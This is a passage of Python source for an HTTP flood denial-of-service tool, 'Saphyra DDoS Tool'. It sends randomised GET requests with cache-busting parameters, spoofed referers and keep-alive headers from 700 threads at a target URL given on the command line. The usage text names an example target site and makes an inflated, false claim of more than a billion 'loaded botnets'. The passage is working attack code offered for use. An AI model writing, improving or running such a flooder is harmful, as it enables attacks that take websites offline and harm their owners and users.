        "https://developers.google.com/speed/pagespeed/insights/?url="
    )
    headers_referers.append("http://help.baidu.com/searchResult?keywords=")
    headers_referers.append("http://www.bing.com/search?q=")
    headers_referers.append("https://add.my.yahoo.com/rss?url=")
    headers_referers.append("https://play.google.com/store/search?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.usatoday.com/search/results?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("http://" + host + "/")
    return headers_referers


# builds random ascii string
def buildblock(size):
    out_str = ""
    for i in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return out_str


def usage():
    print("Saphyra DDoS Tool ( individual Dangerous Denial of Service )")
    print("New loaded Botnets: 1,798,445,657")
    print("Usage: Saphyra (url)")
    print("Example: Saphyra.py http://luthi.co.il/")
    print("\a")


# http request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib2.Request(
        url
        + param_joiner
        + buildblock(random.randint(3, 10))
        + "="
        + buildblock(random.randint(3, 10))
    )
    request.add_header("User-Agent", random.choice(headers_useragents))
    request.add_header("Cache-Control", "no-cache")
    request.add_header("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
    request.add_header(
        "Referer", random.choice(headers_referers) + buildblock(random.randint(50, 100))
    )
    request.add_header("Keep-Alive", random.randint(110, 160))
    request.add_header("Connection", "keep-alive")
    request.add_header("Host", host)
    try:
        urllib2.urlopen(request)
    except urllib.error.HTTPError as e:
        # print e.code
        set_flag(1)
        print("----->>> ! We are Anonymous - ExpectUS ! <<<-----")
        code = 500
    except urllib.error.URLError as e:
        # print e.reason
        sys.exit()
    else:
        inc_counter()
        urllib2.urlopen(request)
    return code


# http caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 500) & (safe == 1):
                    set_flag(2)
        except Exception:
            pass


# monitors http threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) & (previous != request_counter):
                previous = request_counter
        if flag == 2:
            print("\n-- Sending mass amount of packets generated by Liphyra Botnet --")


# execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("Starting the Attack")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search("https?\://([^/]*)/?.*", url)
        if m is None:
            print("Invalid URL format")
            sys.exit()
        else:
            host = m.group(1)
        for i in range(700):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
